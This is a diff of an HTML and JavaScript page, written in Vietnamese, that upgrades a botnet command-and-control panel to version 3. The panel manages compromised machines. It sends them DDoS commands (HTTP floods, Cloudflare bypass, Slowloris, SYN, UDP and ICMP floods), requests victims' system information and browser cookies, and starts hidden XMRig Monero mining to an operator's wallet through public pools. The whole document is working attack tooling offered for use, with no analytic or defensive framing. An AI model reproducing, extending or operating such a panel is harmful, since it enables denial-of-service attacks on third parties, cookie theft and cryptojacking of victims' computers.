@@ -1,205 +1,420 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Botnet Panel</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{background:#0a0a0a;color:#fff;font-family:'Segoe UI',Arial}
-        .header{background:#111;padding:15px 20px;border-bottom:2px solid #e74c3c;display:flex;justify-content:space-between;align-items:center}
-        .header h1{color:#e74c3c;font-size:22px}
-        .header span{color:#aaa;font-size:14px}
-        .main{display:flex;height:calc(100vh - 55px)}
-        .sidebar{width:280px;background:#0f0f0f;padding:15px;overflow-y:auto;border-right:1px solid #222}
-        .sidebar h3{color:#e74c3c;margin-bottom:10px}
-        .bot-card{background:#1a1a1a;padding:12px;margin:8px 0;border-radius:6px;cursor:pointer;border-left:3px solid #555}
-        .bot-card.online{border-left-color:#2ecc71}
-        .bot-card.attacking{border-left-color:#e74c3c}
-        .bot-card.selected{background:#2a2a2a;border:1px solid #e74c3c}
-        .bot-card small{color:#888;display:block}
-        .content{flex:1;padding:25px}
-        .content h2{color:#e74c3c;margin-bottom:20px}
-        .form-group{margin-bottom:15px}
-        label{display:block;color:#aaa;margin-bottom:5px;font-size:13px}
-        select,input{padding:12px;background:#1a1a1a;color:#fff;border:1px solid #333;border-radius:4px;font-size:14px;width:100%}
-        .row{display:flex;gap:10px}
-        .row div{flex:1}
-        button{padding:12px 25px;margin:5px;border:none;border-radius:4px;font-weight:bold;cursor:pointer;font-size:14px}
-        .btn-attack{background:#c0392b;color:#fff}
-        .btn-attack:hover{background:#e74c3c}
-        .btn-stop{background:#27ae60;color:#fff}
-        .btn-stop:hover{background:#2ecc71}
-        .btn-refresh{background:#2980b9;color:#fff;width:100%}
-        .log{background:#0f0f0f;padding:15px;height:250px;overflow-y:auto;margin-top:20px;border-radius:5px;font-family:Consolas;font-size:12px;color:#aaa}
-        .status{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:5px}
-        .status.online{background:#2ecc71}
-        .status.attacking{background:#e74c3c}
-        .status.offline{background:#555}
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Botnet C2 Panel v3</title>
+<style>
+:root{--bg:#0a0a0f;--card:#111118;--red:#e74c3c;--green:#2ecc71;--blue:#3498db;--yellow:#f39c12;--text:#ccc;--border:#1a1a25}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',sans-serif;font-size:13px;display:flex;height:100vh;overflow:hidden}
+.sidebar{width:260px;background:var(--card);border-right:1px solid var(--border);display:flex;flex-direction:column}
+.sidebar-header{padding:12px 15px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center}
+.sidebar-header h2{color:var(--red);font-size:16px}
+.bot-list{flex:1;overflow-y:auto;padding:5px}
+.bot-item{background:#16161f;margin:4px 0;padding:10px;border-radius:4px;cursor:pointer;border-left:3px solid #333;transition:.2s}
+.bot-item:hover{background:#1e1e28}
+.bot-item.online{border-left-color:var(--green)}
+.bot-item.attacking{border-left-color:var(--red)}
+.bot-item.mining{border-left-color:var(--yellow)}
+.bot-item.selected{background:#1a1a30;border:1px solid var(--blue)}
+.bot-item .name{font-weight:bold;font-size:13px}
+.bot-item .info{font-size:11px;color:#777;margin-top:3px}
+.bot-item .info span{margin-right:8px}
+.sidebar-footer{padding:10px;border-top:1px solid var(--border);font-size:11px;color:#666}
+.main{flex:1;display:flex;flex-direction:column;overflow:hidden}
+.tabs{display:flex;background:var(--card);border-bottom:1px solid var(--border)}
+.tab{padding:10px 18px;cursor:pointer;border-bottom:2px solid transparent;font-weight:bold;font-size:12px;color:#888;transition:.2s}
+.tab:hover{color:#fff}
+.tab.active{color:var(--red);border-bottom-color:var(--red)}
+.tab-content{flex:1;overflow-y:auto;padding:15px;display:none}
+.tab-content.active{display:block}
+h3{color:var(--red);margin-bottom:12px;font-size:15px}
+.row{display:flex;gap:10px;margin-bottom:10px;flex-wrap:wrap}
+.col{flex:1;min-width:150px}
+label{display:block;color:#999;font-size:11px;margin-bottom:4px}
+input,select,textarea{width:100%;padding:8px 10px;background:#16161f;color:#fff;border:1px solid #222;border-radius:3px;font-size:12px;outline:none}
+input:focus,select:focus,textarea:focus{border-color:var(--blue)}
+textarea{resize:vertical;min-height:60px;font-family:Consolas,monospace}
+button{padding:8px 16px;border:none;border-radius:3px;cursor:pointer;font-weight:bold;font-size:12px;transition:.2s}
+.btn-red{background:var(--red);color:#fff}
+.btn-red:hover{background:#c0392b}
+.btn-green{background:var(--green);color:#fff}
+.btn-green:hover{background:#27ae60}
+.btn-blue{background:var(--blue);color:#fff}
+.btn-blue:hover{background:#2980b9}
+.btn-yellow{background:var(--yellow);color:#000}
+.btn-yellow:hover{background:#e67e22}
+.btn-group{display:flex;gap:5px;flex-wrap:wrap;margin:8px 0}
+.card{background:var(--card);border:1px solid var(--border);border-radius:5px;padding:15px;margin-bottom:12px}
+.log-box{background:#0a0a0f;border:1px solid #1a1a25;border-radius:3px;padding:10px;height:200px;overflow-y:auto;font-family:Consolas,monospace;font-size:11px;color:#888}
+.log-box div{margin:2px 0}
+.log-cmd{color:var(--yellow)}
+.log-info{color:var(--blue)}
+.log-ok{color:var(--green)}
+.log-err{color:var(--red)}
+.badge{display:inline-block;padding:2px 6px;border-radius:3px;font-size:10px;margin:2px}
+.badge-l7{background:#e74c3c22;color:var(--red)}
+.badge-l4{background:#3498db22;color:var(--blue)}
+.badge-cpu{background:#2ecc7122;color:var(--green)}
+.badge-gpu{background:#f39c1222;color:var(--yellow)}
+.cookie-box{background:#0a0a0f;border:1px solid #222;padding:8px;border-radius:3px;max-height:120px;overflow-y:auto;font-family:Consolas;font-size:10px;word-break:break-all;margin-top:5px}
+</style>
 </head>
 <body>
-    <div class="header">
-        <h1>☠️ BOTNET PANEL v2.0</h1>
-        <span id="botCount">🤖 Bot: 0 | Online: 0</span>
+
+<!-- SIDEBAR -->
+<div class="sidebar">
+    <div class="sidebar-header">
+        <h2>☠️ BOTNET C2</h2>
+        <span id="botCount" style="font-size:11px">0 bot</span>
     </div>
-    <div class="main">
-        <div class="sidebar">
-            <h3>🤖 DANH SÁCH BOT</h3>
-            <button class="btn-refresh" onclick="refreshBots()">🔄 LÀM MỚI</button>
-            <button class="btn-refresh" style="background:#555;margin-top:5px" onclick="selectAll()">✅ CHỌN TẤT CẢ</button>
-            <div id="botList"></div>
-        </div>
-        <div class="content">
-            <h2>⚔️ ĐIỀU KHIỂN TẤN CÔNG</h2>
-            <div class="form-group">
-                <label>🎯 MỤC TIÊU</label>
-                <input type="text" id="target" placeholder="http://target.com hoặc IP:Port">
-            </div>
+    <div style="padding:5px 10px">
+        <select id="filter" onchange="renderBots()" style="font-size:11px">
+            <option value="ALL">Tất cả</option>
+            <option value="ONLINE">Online</option>
+            <option value="ATTACKING">Đang tấn công</option>
+            <option value="MINING">Đang đào coin</option>
+            <option value="IDLE">Rảnh</option>
+        </select>
+    </div>
+    <div class="bot-list" id="botList"></div>
+    <div class="sidebar-footer">
+        <div>🟢 Online: <b id="onlineCount">0</b></div>
+        <div>🔴 Attack: <b id="attackCount">0</b></div>
+        <div>🟡 Mining: <b id="miningCount">0</b></div>
+    </div>
+</div>
+
+<!-- MAIN -->
+<div class="main">
+    <div class="tabs">
+        <div class="tab active" onclick="switchTab(0)">⚔️ TẤN CÔNG</div>
+        <div class="tab" onclick="switchTab(1)">💻 THÔNG TIN BOT</div>
+        <div class="tab" onclick="switchTab(2)">⛏️ ĐÀO COIN</div>
+        <div class="tab" onclick="switchTab(3)">📋 LOG</div>
+    </div>
+
+    <!-- TAB 0: TẤN CÔNG -->
+    <div class="tab-content active" id="tab0">
+        <div class="card">
+            <h3>⚔️ GỬI LỆNH TẤN CÔNG</h3>
             <div class="row">
-                <div>
+                <div class="col">
+                    <label>🎯 MỤC TIÊU</label>
+                    <input type="text" id="target" placeholder="http://target.com hoặc IP:Port">
+                </div>
+                <div class="col" style="max-width:200px">
                     <label>📂 LAYER</label>
-                    <select id="layer" onchange="changeMethods()">
-                        <option value="L7">Layer 7 - HTTP/HTTPS</option>
-                        <option value="L4">Layer 4 - TCP/UDP</option>
+                    <select id="layer" onchange="updateMethods()">
+                        <option value="L7">Layer 7</option>
+                        <option value="L4">Layer 4</option>
                     </select>
                 </div>
-                <div>
+                <div class="col" style="max-width:250px">
                     <label>⚔️ PHƯƠNG THỨC</label>
-                    <select id="method">
-                        <option value="GET_FLOOD">GET Flood</option>
-                        <option value="POST_FLOOD">POST Flood</option>
-                        <option value="CF_BYPASS">CF Bypass</option>
-                        <option value="SLOWLORIS">Slowloris</option>
-                        <option value="HEAD_FLOOD">HEAD Flood</option>
-                    </select>
+                    <select id="method"></select>
                 </div>
             </div>
             <div class="row">
-                <div>
+                <div class="col" style="max-width:150px">
                     <label>🧵 SỐ LUỒNG</label>
                     <input type="number" id="threads" value="100">
                 </div>
-                <div>
-                    <label>⏱️ THỜI GIAN (giây)</label>
+                <div class="col" style="max-width:150px">
+                    <label>⏱️ THỜI GIAN (s)</label>
                     <input type="number" id="duration" value="60">
                 </div>
             </div>
-            <div style="margin-top:20px">
-                <button class="btn-attack" onclick="attack('ALL')">🔥 TẤN CÔNG TẤT CẢ</button>
-                <button class="btn-attack" onclick="attack('SELECTED')">🎯 TẤN CÔNG BOT ĐÃ CHỌN</button>
-                <button class="btn-stop" onclick="stopAttack('ALL')">⏹ DỪNG TẤT CẢ</button>
+            <div class="btn-group">
+                <button class="btn-red" onclick="sendAttack('ALL')">🔥 TẤN CÔNG TẤT CẢ</button>
+                <button class="btn-red" onclick="sendAttack('SELECTED')">🎯 TẤN CÔNG ĐÃ CHỌN</button>
+                <button class="btn-green" onclick="sendStop('ALL')">⏹ DỪNG TẤT CẢ</button>
+                <button class="btn-green" onclick="sendStop('SELECTED')">⏹ DỪNG ĐÃ CHỌN</button>
             </div>
-            <div class="log" id="log">[HỆ THỐNG] Sẵn sàng...</div>
+        </div>
+
+        <div class="card">
+            <h3>💻 CMD THỦ CÔNG</h3>
+            <label>Nhập lệnh trực tiếp (theo định dạng method|target|threads|duration)</label>
+            <div class="row">
+                <div class="col">
+                    <input type="text" id="cmdInput" placeholder="VD: GET_FLOOD|http://target.com|200|120">
+                </div>
+                <div class="col" style="max-width:200px">
+                    <label>GỬI ĐẾN</label>
+                    <select id="cmdTarget">
+                        <option value="ALL">Tất cả bot</option>
+                    </select>
+                </div>
+                <button class="btn-yellow" onclick="sendCmd()" style="height:30px;margin-top:16px">▶️ CHẠY</button>
+            </div>
+            <div style="margin-top:5px;font-size:10px;color:#666">
+                Methods có sẵn: 
+                <span class="badge badge-l7">GET_FLOOD</span>
+                <span class="badge badge-l7">POST_FLOOD</span>
+                <span class="badge badge-l7">CF_BYPASS</span>
+                <span class="badge badge-l7">SLOWLORIS</span>
+                <span class="badge badge-l7">HEAD_FLOOD</span>
+                <span class="badge badge-l4">TCP_SYN</span>
+                <span class="badge badge-l4">UDP_FLOOD</span>
+                <span class="badge badge-l4">TCP_CONNECT</span>
+            </div>
         </div>
     </div>
 
-    <script>
-        let selectedBot = null;
-        let API = '/api';
+    <!-- TAB 1: THÔNG TIN BOT -->
+    <div class="tab-content" id="tab1">
+        <div class="card">
+            <h3>💻 THÔNG TIN HỆ THỐNG</h3>
+            <div class="btn-group">
+                <button class="btn-blue" onclick="getBotInfo('ALL')">📊 LẤY THÔNG TIN TẤT CẢ</button>
+                <button class="btn-blue" onclick="getBotInfo('SELECTED')">📊 LẤY THÔNG TIN ĐÃ CHỌN</button>
+                <button class="btn-yellow" onclick="getCookies('ALL')">🍪 LẤY COOKIE TẤT CẢ</button>
+                <button class="btn-yellow" onclick="getCookies('SELECTED')">🍪 LẤY COOKIE ĐÃ CHỌN</button>
+            </div>
+            <div id="botInfoContainer"></div>
+        </div>
+    </div>
 
-        function log(msg) {
-            let l = document.getElementById('log');
-            l.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${msg}`;
-            l.scrollTop = l.scrollHeight;
-        }
+    <!-- TAB 2: ĐÀO COIN -->
+    <div class="tab-content" id="tab2">
+        <div class="card">
+            <h3>⛏️ ĐÀO COIN (XMRig)</h3>
+            <div class="row">
+                <div class="col">
+                    <label>💰 VÍ BTC/USDT</label>
+                    <input type="text" id="wallet" placeholder="Nhập địa chỉ ví">
+                </div>
+                <div class="col" style="max-width:200px">
+                    <label>🏊 POOL</label>
+                    <select id="pool">
+                        <option value="pool.supportxmr.com:3333">SupportXMR</option>
+                        <option value="xmr.pool.minergate.com:45700">MinerGate</option>
+                        <option value="pool.minexmr.com:4444">MineXMR</option>
+                    </select>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col" style="max-width:150px">
+                    <label>🔧 CPU THREADS</label>
+                    <input type="number" id="cpuThreads" value="2" max="8">
+                </div>
+                <div class="col" style="max-width:150px">
+                    <label>⚡ ƯU TIÊN</label>
+                    <select id="priority">
+                        <option value="low">Thấp (ẩn)</option>
+                        <option value="normal">Trung bình</option>
+                        <option value="high">Cao</option>
+                    </select>
+                </div>
+            </div>
+            <div class="btn-group">
+                <button class="btn-yellow" onclick="startMining('ALL')">⛏️ BẮT ĐẦU ĐÀO (TẤT CẢ)</button>
+                <button class="btn-yellow" onclick="startMining('SELECTED')">⛏️ BẮT ĐẦU ĐÀO (ĐÃ CHỌN)</button>
+                <button class="btn-green" onclick="stopMining('ALL')">⏹ DỪNG ĐÀO (TẤT CẢ)</button>
+                <button class="btn-green" onclick="stopMining('SELECTED')">⏹ DỪNG ĐÀO (ĐÃ CHỌN)</button>
+            </div>
+            <div style="font-size:11px;color:#666;margin-top:8px">
+                💡 Ví đã lưu: <b id="savedWallet">Chưa có</b>
+            </div>
+        </div>
+    </div>
 
-        async function refreshBots() {
-            try {
-                let res = await fetch(API + '/bots');
-                let bots = await res.json();
-                let html = '';
-                let online = 0;
-                for (let id in bots) {
-                    let b = bots[id];
-                    if (b.online) online++;
-                    let cls = b.status === 'ATTACKING' ? 'attacking' : (b.online ? 'online' : '');
-                    let sel = (selectedBot === id) ? ' selected' : '';
-                    html += `<div class="bot-card ${cls}${sel}" onclick="selectBot('${id}')">
-                        <span class="status ${b.online ? 'online' : 'offline'}"></span>
-                        <b>${b.hostname}</b>
-                        <small>ID: ${id} | ${b.status}</small>
-                        <small>IP: ${b.ip} | ${b.target || 'Sẵn sàng'}</small>
-                    </div>`;
-                }
-                document.getElementById('botList').innerHTML = html || '<p style="color:#555">Chưa có bot nào</p>';
-                document.getElementById('botCount').innerHTML = `🤖 Bot: ${Object.keys(bots).length} | Online: ${online}`;
-            } catch(e) {
-                log('LỖI: Không kết nối được server');
-            }
-        }
+    <!-- TAB 3: LOG -->
+    <div class="tab-content" id="tab3">
+        <div class="card">
+            <h3>📋 NHẬT KÝ HOẠT ĐỘNG</h3>
+            <button class="btn-blue" onclick="clearLog()" style="margin-bottom:8px">🗑️ XÓA LOG</button>
+            <div class="log-box" id="logBox"></div>
+        </div>
+    </div>
+</div>
 
-        function selectBot(id) {
-            selectedBot = id;
-            document.querySelectorAll('.bot-card').forEach(el => el.classList.remove('selected'));
-            let cards = document.querySelectorAll('.bot-card');
-            cards.forEach(c => { if (c.textContent.includes(id)) c.classList.add('selected'); });
-            log('Đã chọn bot: ' + id);
-        }
+<script>
+// ===== BIẾN TOÀN CỤC =====
+const API = '/api';
+let bots = {};
+let selectedBot = null;
+let savedWallet = localStorage.getItem('btc_wallet') || '';
+if(savedWallet) document.getElementById('savedWallet').textContent = savedWallet;
 
-        function selectAll() {
-            selectedBot = 'ALL';
-            document.querySelectorAll('.bot-card').forEach(el => el.classList.remove('selected'));
-            log('Đã chọn TẤT CẢ bot');
-        }
+// ===== LOG =====
+function addLog(msg, cls='log-info'){
+    let box = document.getElementById('logBox');
+    box.innerHTML += `<div class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+    box.scrollTop = box.scrollHeight;
+}
 
-        function changeMethods() {
-            let layer = document.getElementById('layer').value;
-            let method = document.getElementById('method');
-            method.innerHTML = '';
-            if (layer === 'L7') {
-                let m = ['GET_FLOOD','POST_FLOOD','CF_BYPASS','SLOWLORIS','HEAD_FLOOD','RANDOM_UA','MIXED_FLOOD'];
-                m.forEach(x => method.innerHTML += `<option value="${x}">${x}</option>`);
-            } else {
-                let m = ['TCP_SYN','TCP_CONNECT','UDP_FLOOD','TCP_ACK','TCP_RST','TCP_XMAS','SYN_ACK_MIX'];
-                m.forEach(x => method.innerHTML += `<option value="${x}">${x}</option>`);
-            }
-        }
+// ===== SWITCH TAB =====
+function switchTab(i){
+    document.querySelectorAll('.tab').forEach((t,j)=>t.classList.toggle('active',j===i));
+    document.querySelectorAll('.tab-content').forEach((t,j)=>t.classList.toggle('active',j===i));
+}
 
-        async function attack(target) {
-            let botId = target === 'ALL' ? 'ALL' : selectedBot;
-            if (!botId) { alert('Chọn bot trước!'); return; }
-            
-            let data = {
-                botId: botId,
-                layer: document.getElementById('layer').value,
-                method: document.getElementById('method').value,
-                target: document.getElementById('target').value,
-                threads: document.getElementById('threads').value,
-                duration: document.getElementById('duration').value
-            };
-            
-            if (!data.target) { alert('Nhập mục tiêu!'); return; }
-            
-            try {
-                let res = await fetch(API + '/attack', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data)
-                });
-                let result = await res.json();
-                log(`🚀 Lệnh tấn công đã gửi: ${data.method} → ${data.target} (${botId})`);
-            } catch(e) {
-                log('LỖI gửi lệnh!');
-            }
-        }
+// ===== UPDATE METHODS =====
+function updateMethods(){
+    let layer = document.getElementById('layer').value;
+    let sel = document.getElementById('method');
+    sel.innerHTML = '';
+    let methods = layer==='L7' 
+        ? ['GET_FLOOD','POST_FLOOD','CF_BYPASS','SLOWLORIS','HEAD_FLOOD','RANDOM_UA','MIXED_FLOOD','WEBSOCKET']
+        : ['TCP_SYN','TCP_CONNECT','UDP_FLOOD','TCP_ACK','TCP_RST','TCP_XMAS','SYN_ACK_MIX','ICMP_FLOOD'];
+    methods.forEach(m=>sel.innerHTML+=`<option value="${m}">${m}</option>`);
+}
 
-        async function stopAttack(target) {
-            let botId = target === 'ALL' ? 'ALL' : selectedBot;
-            try {
-                await fetch(API + '/stop', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({botId: botId})
-                });
-                log('⏹ Lệnh dừng đã gửi: ' + botId);
-            } catch(e) {}
-        }
+// ===== RENDER BOTS =====
+function renderBots(){
+    let filter = document.getElementById('filter').value;
+    let container = document.getElementById('botList');
+    let html = '';
+    let online=0, attacking=0, mining=0;
+    
+    for(let id in bots){
+        let b = bots[id];
+        if(!b.online) continue;
+        online++;
+        if(b.status==='ATTACKING') attacking++;
+        if(b.status==='MINING') mining++;
+        
+        if(filter==='ATTACKING' && b.status!=='ATTACKING') continue;
+        if(filter==='MINING' && b.status!=='MINING') continue;
+        if(filter==='IDLE' && b.status!=='ONLINE') continue;
+        if(filter==='ONLINE' && b.status==='OFFLINE') continue;
+        
+        let cls = b.status==='ATTACKING'?'attacking':(b.status==='MINING'?'mining':'online');
+        let sel = selectedBot===id?' selected':'';
+        let cpu = b.cpu||'?';
+        let ram = b.ram||'?';
+        
+        html += `<div class="bot-item ${cls}${sel}" onclick="selectBot('${id}')">
+            <div class="name">${b.hostname||id.substring(0,8)}</div>
+            <div class="info">
+                <span>🟢 ${b.status}</span>
+                <span>💻 CPU:${cpu}%</span>
+                <span>📊 RAM:${ram}%</span>
+            </div>
+            ${b.target?`<div class="info">🎯 ${b.target}</div>`:''}
+        </div>`;
+    }
+    
+    container.innerHTML = html || '<div style="padding:10px;color:#555">Chưa có bot</div>';
+    document.getElementById('botCount').textContent = online + ' bot';
+    document.getElementById('onlineCount').textContent = online;
+    document.getElementById('attackCount').textContent = attacking;
+    document.getElementById('miningCount').textContent = mining;
+    
+    // Update cmd target dropdown
+    let cmdTarget = document.getElementById('cmdTarget');
+    cmdTarget.innerHTML = '<option value="ALL">Tất cả bot</option>';
+    for(let id in bots){
+        if(bots[id].online) cmdTarget.innerHTML += `<option value="${id}">${bots[id].hostname||id.substring(0,8)}</option>`;
+    }
+}
 
-        // Tự động refresh mỗi 3 giây
-        setInterval(refreshBots, 3000);
-        refreshBots();
-        log('✅ Panel đã sẵn sàng');
-    </script>
+// ===== SELECT BOT =====
+function selectBot(id){
+    selectedBot = id;
+    document.querySelectorAll('.bot-item').forEach(el=>el.classList.remove('selected'));
+    // Tìm và thêm class selected
+    let items = document.querySelectorAll('.bot-item');
+    items.forEach(el=>{if(el.textContent.includes(id)||el.querySelector('.name')?.textContent.includes(id))el.classList.add('selected')});
+}
+
+// ===== SEND ATTACK =====
+async function sendAttack(target){
+    let botId = target==='ALL'?'ALL':selectedBot;
+    if(!botId){alert('Chọn bot!');return}
+    let data = {
+        botId, layer: document.getElementById('layer').value,
+        method: document.getElementById('method').value,
+        target: document.getElementById('target').value,
+        threads: document.getElementById('threads').value,
+        duration: document.getElementById('duration').value
+    };
+    if(!data.target){alert('Nhập mục tiêu!');return}
+    await fetch(API+'/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
+    addLog(`🚀 Gửi lệnh: ${data.method} → ${data.target} [${botId}]`,'log-cmd');
+}
+
+// ===== SEND STOP =====
+async function sendStop(target){
+    let botId = target==='ALL'?'ALL':selectedBot;
+    await fetch(API+'/stop',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({botId})});
+    addLog(`⏹ Dừng: ${botId}`,'log-ok');
+}
+
+// ===== SEND CMD =====
+function sendCmd(){
+    let cmd = document.getElementById('cmdInput').value;
+    let target = document.getElementById('cmdTarget').value;
+    if(!cmd){alert('Nhập lệnh!');return}
+    let parts = cmd.split('|');
+    if(parts.length<4){alert('Định dạng: method|target|threads|duration');return}
+    let data = {
+        botId: target,
+        method: parts[0], target: parts[1],
+        threads: parts[2], duration: parts[3],
+        layer: parts[0].startsWith('TCP')||parts[0].startsWith('UDP')?'L4':'L7'
+    };
+    fetch(API+'/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
+    addLog(`💻 CMD: ${cmd} → ${target}`,'log-cmd');
+}
+
+// ===== GET BOT INFO =====
+async function getBotInfo(target){
+    let botId = target==='ALL'?'ALL':selectedBot;
+    await fetch(API+'/getinfo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({botId})});
+    addLog(`📊 Yêu cầu thông tin: ${botId}`,'log-info');
+}
+
+// ===== GET COOKIES =====
+async function getCookies(target){
+    let botId = target==='ALL'?'ALL':selectedBot;
+    await fetch(API+'/cookies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({botId})});
+    addLog(`🍪 Yêu cầu cookie: ${botId}`,'log-info');
+}
+
+// ===== MINING =====
+async function startMining(target){
+    let wallet = document.getElementById('wallet').value;
+    if(!wallet){alert('Nhập ví BTC!');return}
+    localStorage.setItem('btc_wallet', wallet);
+    document.getElementById('savedWallet').textContent = wallet;
+    let botId = target==='ALL'?'ALL':selectedBot;
+    let data = {
+        botId, action:'start_mining', wallet,
+        pool: document.getElementById('pool').value,
+        threads: document.getElementById('cpuThreads').value,
+        priority: document.getElementById('priority').value
+    };
+    await fetch(API+'/mining',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
+    addLog(`⛏️ Bắt đầu đào: ${wallet} [${botId}]`,'log-cmd');
+}
+
+async function stopMining(target){
+    let botId = target==='ALL'?'ALL':selectedBot;
+    await fetch(API+'/mining',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({botId,action:'stop_mining'})});
+    addLog(`⏹ Dừng đào: ${botId}`,'log-ok');
+}
+
+// ===== CLEAR LOG =====
+function clearLog(){document.getElementById('logBox').innerHTML='';}
+
+// ===== REFRESH BOTS =====
+async function refreshBots(){
+    try{
+        let res = await fetch(API+'/bots');
+        bots = await res.json();
+        renderBots();
+    }catch(e){}
+}
+
+// ===== INIT =====
+updateMethods();
+refreshBots();
+setInterval(refreshBots, 3000);
+addLog('✅ Panel C2 v3 đã sẵn sàng','log-ok');
+</script>
 </body>
 </html>
